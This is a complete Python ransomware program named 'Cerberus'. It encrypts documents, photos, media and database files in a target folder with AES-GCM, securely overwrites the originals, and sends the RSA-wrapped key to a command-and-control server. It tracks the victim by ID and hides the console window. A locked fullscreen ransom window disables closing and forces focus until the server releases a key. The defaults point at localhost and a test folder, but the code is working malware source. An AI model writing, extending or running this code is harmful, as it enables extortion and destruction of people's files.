# ransomware.py
import os
import sys
import base64
import json
import threading
import time
import ctypes
from tkinter import Tk, Label, Entry, Button, StringVar, Frame, PhotoImage
from tkinter import font as tkfont
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
import requests

# --- Configuration ---
# PASTE THE PUBLIC KEY FROM THE C2 SERVER'S CONSOLE OUTPUT HERE
ATTACKER_PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyX1m6vQkFgHqCwG9xN8
... (Your public key will be here) ...
FQIDAQAB
-----END PUBLIC KEY-----"""

C2_SERVER_URL = "http://127.0.0.1:5000" # Change if your C2 is hosted elsewhere
TARGET_DIRECTORY = os.path.join(os.path.expanduser("~"), "test_data")
LOCK_FILE = os.path.join(TARGET_DIRECTORY, ".cerberus_lock")
ID_FILE = os.path.join(TARGET_DIRECTORY, "cerberus_id.txt") # PERSISTENCE: Store ID here
LOG_FILE = os.path.join(TARGET_DIRECTORY, "cerberus_log.txt")
ENCRYPTED_EXTENSION = ".cerberus"

# --- File Type Targeting ---
TARGET_EXTENSIONS = {
    '.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf',
    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.svg',
    '.mp3', '.wav', '.mp4', '.avi', '.mov', '.mkv', '.sql', '.db'
}

# --- GUI Asset (Base64 encoded 1x1 red pixel for logo) ---
# For more realism, replace this with a base64 string of a real menacing logo
LOGO_BASE64 = """
iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg==
"""

# --- System Lockdown Utilities ---
def hide_console():
    """Hides the console window on Windows."""
    if os.name == 'nt':
        try:
            kernel32 = ctypes.WinDLL('kernel32')
            user32 = ctypes.WinDLL('user32')
            hWnd = kernel32.GetConsoleWindow()
            if hWnd:
                user32.ShowWindow(hWnd, 0) # SW_HIDE = 0
        except Exception as e:
            log_error(f"Failed to hide console: {e}")

# --- Cryptography ---
def generate_aes_key():
    return os.urandom(32)

def encrypt_file_aes_gcm(file_path, key):
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        nonce = os.urandom(12)
        cipher = Cipher(algorithms.AES(key), modes.GCM(nonce), backend=default_backend())
        encryptor = cipher.encryptor()
        encrypted_data = encryptor.update(data) + encryptor.finalize()
        with open(file_path + ENCRYPTED_EXTENSION, 'wb') as f:
            f.write(nonce + encryptor.tag + encrypted_data)
        return True
    except Exception as e:
        log_error(f"Failed to encrypt {file_path}: {e}")
        return False

def decrypt_file_aes_gcm(encrypted_path, key):
    try:
        with open(encrypted_path, 'rb') as f:
            nonce_tag_data = f.read()
        nonce, tag, encrypted_data = nonce_tag_data[:12], nonce_tag_data[12:28], nonce_tag_data[28:]
        cipher = Cipher(algorithms.AES(key), modes.GCM(nonce, tag), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
        original_path = encrypted_path.removesuffix(ENCRYPTED_EXTENSION)
        with open(original_path, 'wb') as f:
            f.write(decrypted_data)
        os.remove(encrypted_path)
        return True
    except Exception as e:
        log_error(f"Failed to decrypt {encrypted_path}: {e}")
        return False

def secure_delete_file(file_path, passes=3):
    try:
        with open(file_path, "ba+") as f:
            length = f.tell()
        for _ in range(passes):
            with open(file_path, "r+b") as f:
                f.seek(0)
                f.write(os.urandom(length))
        os.remove(file_path)
    except Exception as e:
        log_error(f"Failed to securely delete {file_path}: {e}")

# --- Logging ---
def log_error(message):
    try:
        with open(LOG_FILE, 'a') as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - ERROR: {message}\n")
    except:
        pass # Can't log, nothing to do

# --- Ransomware Logic ---
def encrypt_directory():
    if not os.path.exists(TARGET_DIRECTORY):
        os.makedirs(TARGET_DIRECTORY)
        log_error(f"Created target directory: {TARGET_DIRECTORY}")

    # Persistence check happens in main now, but double check lock file
    if os.path.exists(LOCK_FILE):
        log_error("Encryption already performed. Skipping encryption phase.")
        return None

    aes_key = generate_aes_key()
    encrypted_files = 0
    for root, _, files in os.walk(TARGET_DIRECTORY):
        for file in files:
            file_path = os.path.join(root, file)
            if os.path.splitext(file)[1].lower() in TARGET_EXTENSIONS and not file_path.endswith(ENCRYPTED_EXTENSION):
                if encrypt_file_aes_gcm(file_path, aes_key):
                    secure_delete_file(file_path)
                    encrypted_files += 1

    # Mark as complete
    with open(LOCK_FILE, 'w') as f:
        f.write("Encryption complete.")

    log_error(f"Encryption finished. {encrypted_files} files targeted.")
    return aes_key

def check_in_with_c2(aes_key):
    try:
        from cryptography.hazmat.primitives import serialization
        from cryptography.hazmat.primitives.asymmetric import padding
        
        public_key = serialization.load_pem_public_key(ATTACKER_PUBLIC_KEY.encode(), backend=default_backend())
        encrypted_aes_key = public_key.encrypt(
            aes_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        payload = {"key": base64.b64encode(encrypted_aes_key).decode('utf-8')}
        
        response = requests.post(f"{C2_SERVER_URL}/api/checkin", json=payload, timeout=10)
        response.raise_for_status()
        victim_id = response.json()['victim_id']
        
        # PERSISTENCE: Save Victim ID
        with open(ID_FILE, 'w') as f:
            f.write(victim_id)
            
        log_error(f"Successfully checked in. Victim ID: {victim_id}")
        return victim_id
    except Exception as e:
        log_error(f"C2 check-in failed: {e}")
        return None

# --- GUI Logic ---
class RansomwareGUI:
    def __init__(self, master, victim_id):
        self.master = master
        self.victim_id = victim_id
        self.key_url = None

        # Kiosk Mode Settings
        master.overrideredirect(True)  # Remove title bar
        master.attributes('-fullscreen', True)  # Fullscreen
        master.attributes('-topmost', True)  # Always on top
        master.configure(bg='#0a0a0a')
        
        # Aggressive Focus Grabbing
        master.bind('<FocusOut>', self.refocus) # Prevent losing focus
        master.bind('<Escape>', lambda e: None) # Disable Escape key
        master.protocol("WM_DELETE_WINDOW", self.disable_event) # Disable close button
        self.force_focus_loop() # Start persistent focus loop

        # GUI Elements
        try:
            logo_data = base64.b64decode(LOGO_BASE64)
            self.logo = PhotoImage(data=logo_data)
        except:
            self.logo = None # Fallback if no logo

        main_frame = Frame(master, bg='#0a0a0a')
        main_frame.pack(expand=True, fill='both', padx=50, pady=50)

        if self.logo:
            Label(main_frame, image=self.logo, bg='#0a0a0a').pack(pady=10)

        title_font = tkfont.Font(family="Helvetica", size=24, weight="bold")
        body_font = tkfont.Font(family="Helvetica", size=14)

        Label(main_frame, text="YOUR FILES HAVE BEEN ENCRYPTED", font=title_font, fg='#ff4d4d', bg='#0a0a0a').pack(pady=10)
        Label(main_frame, text="Your documents, photos, and other important files have been locked.", font=body_font, fg='#cccccc', bg='#0a0a0a', wraplength=600).pack(pady=5)
        
        Label(main_frame, text=f"YOUR VICTIM ID IS:", font=body_font, fg='#ffffff', bg='#0a0a0a').pack(pady=(20, 5))
        self.victim_id_label = Label(main_frame, text=self.victim_id, font=tkfont.Font(family="Courier", size=16, weight="bold"), fg='#4dff88', bg='#0a0a0a')
        self.victim_id_label.pack()

        self.status_label = Label(main_frame, text="STATUS: Awaiting payment confirmation...", font=body_font, fg='#ffff4d', bg='#0a0a0a')
        self.status_label.pack(pady=(20, 5))

        Label(main_frame, text="Payment detected automatically. Do not close this window.", font=body_font, fg='#cccccc', bg='#0a0a0a').pack(pady=5)
        
        self.key_var = StringVar()
        self.key_entry = Entry(main_frame, textvariable=self.key_var, font=tkfont.Font(family="Courier", size=12), show="*", width=64, bg='#2a2a2a', fg='#ffffff', insertbackground='white')
        self.key_entry.pack(pady=10, ipady=4)
        self.key_entry.config(state='readonly')

        self.decrypt_button = Button(main_frame, text="DECRYPT FILES", font=tkfont.Font(family="Helvetica", size=14, weight="bold"), command=self.start_decryption, bg='#ff4d4d', fg='white', activebackground='#cc0000', activeforeground='white')
        self.decrypt_button.pack(pady=20)
        self.decrypt_button.config(state='disabled') # Disabled until key arrives

        # Start the heartbeat thread
        self.heartbeat_thread_running = True
        self.heartbeat_thread = threading.Thread(target=self.heartbeat_polling, daemon=True)
        self.heartbeat_thread.start()

    def refocus(self, event=None):
        self.master.focus_force()
    
    def force_focus_loop(self):
        """Aggressively brings window to front every 100ms"""
        self.master.lift()
        self.master.focus_force()
        self.master.after(100, self.force_focus_loop)

    def disable_event(self):
        pass

    def heartbeat_polling(self):
        while self.heartbeat_thread_running:
            try:
                response = requests.get(f"{C2_SERVER_URL}/api/status/{self.victim_id}", timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    if data.get("status") == "ready":
                        # UPDATED: Get key directly from JSON
                        key = data.get("key")
                        if key:
                            self.master.after(0, self.update_key_field, key)
                            self.heartbeat_thread_running = False
            except Exception as e:
                log_error(f"Heartbeat error: {e}")
            time.sleep(10) # Poll more frequently (10s) for better UX

    def update_key_field(self, key):
        self.key_var.set(key)
        self.key_entry.config(state='normal')
        self.status_label.config(text="STATUS: Valid key received. Decryption enabled.", fg='#4dff88')
        self.decrypt_button.config(state='normal')
        self.key_entry.config(state='readonly')

    def start_decryption(self):
        key_b64 = self.key_var.get()
        if not key_b64:
            return
        try:
            key = base64.b64decode(key_b64)
            decrypted_files = 0
            for root, _, files in os.walk(TARGET_DIRECTORY):
                for file in files:
                    if file.endswith(ENCRYPTED_EXTENSION):
                        file_path = os.path.join(root, file)
                        if decrypt_file_aes_gcm(file_path, key):
                            decrypted_files += 1
            
            # Clean up persistence files
            if os.path.exists(LOCK_FILE): os.remove(LOCK_FILE)
            if os.path.exists(ID_FILE): os.remove(ID_FILE)
            
            self.status_label.config(text=f"SUCCESS! {decrypted_files} files decrypted.", fg='#4dff88')
            self.heartbeat_thread_running = False
            self.decrypt_button.config(state='disabled')
            
            # Allow closing
            self.master.protocol("WM_DELETE_WINDOW", self.master.destroy)
            self.master.bind('<Escape>', lambda e: self.master.destroy())
            
            # Stop the aggressive focus loop (tricky in Tkinter to cancel 'after', 
            # but destroying window will stop it)

        except Exception as e:
            log_error(f"Decryption failed: {e}")
            self.status_label.config(text="ERROR: Decryption failed.", fg='red')

# --- Main Execution ---
if __name__ == "__main__":
    # Hide console immediately
    hide_console()

    # PERSISTENCE CHECK: Do we already have an ID?
    if os.path.exists(ID_FILE):
        try:
            with open(ID_FILE, 'r') as f:
                victim_id = f.read().strip()
            if victim_id:
                log_error(f"Resuming session for Victim ID: {victim_id}")
                root = Tk()
                app = RansomwareGUI(root, victim_id)
                root.mainloop()
                sys.exit()
        except Exception as e:
            log_error(f"Failed to read persistence file: {e}")
            # Fall through to new infection if file is corrupt

    # NEW INFECTION
    aes_key = encrypt_directory()
    
    if aes_key:
        victim_id = check_in_with_c2(aes_key)
        if victim_id:
            root = Tk()
            app = RansomwareGUI(root, victim_id)
            root.mainloop()
        else:
            log_error("Failed to get Victim ID. Aborting GUI.")
    else:
        log_error("Encryption skipped or failed. Aborting.")
